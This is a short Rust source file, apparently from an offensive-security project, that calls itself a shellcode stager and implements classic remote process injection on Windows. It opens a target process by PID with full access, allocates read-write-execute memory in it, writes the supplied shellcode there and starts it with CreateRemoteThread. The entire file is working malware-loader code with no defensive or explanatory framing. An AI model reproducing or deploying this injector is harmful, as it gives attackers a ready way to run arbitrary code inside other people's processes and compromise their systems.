//! This is a basic stager for some shellcode
//! It injects shellcode in a remote process, slaps in the shellcode, and runs it.
//! [Rust programmers when they see `unsafe` blocks in my code](https://www.youtube.com/watch?v=k_BgxAch4u0)

use std::ffi::c_void;

use windows::core::{Error, HSTRING};
use windows::Win32::Foundation::{E_HANDLE, E_POINTER};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS,
};

/// Classic process injection
/// 1. `OpenProcess`
/// 2. `VirtualAllocEx`
/// 3. `WriteProcessMemory`
/// 4. `CreateRemoteThread`
pub fn inject(pid: u32, shellcode: &[u8]) -> Result<(), Error> {
    let size = shellcode.len();

    let proc_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, true, pid) }?;

    if proc_handle.is_invalid() {
        return Err(Error::new(E_HANDLE, HSTRING::new()));
    }

    let alloced_mem = unsafe {
        VirtualAllocEx(
            proc_handle,
            None,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if alloced_mem.is_null() {
        return Err(Error::new(E_POINTER, HSTRING::new()));
    }

    let shellcode_mem: *const c_void = shellcode.as_ptr().cast();
    if shellcode_mem.is_null() {
        return Err(Error::new(E_POINTER, HSTRING::new()));
    }

    unsafe {
        let lp_start_addr: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(alloced_mem));
        WriteProcessMemory(proc_handle, alloced_mem, shellcode_mem, size, None);
        CreateRemoteThread(proc_handle, None, 0, lp_start_addr, None, 0, None)?;
    }

    Ok(())
}
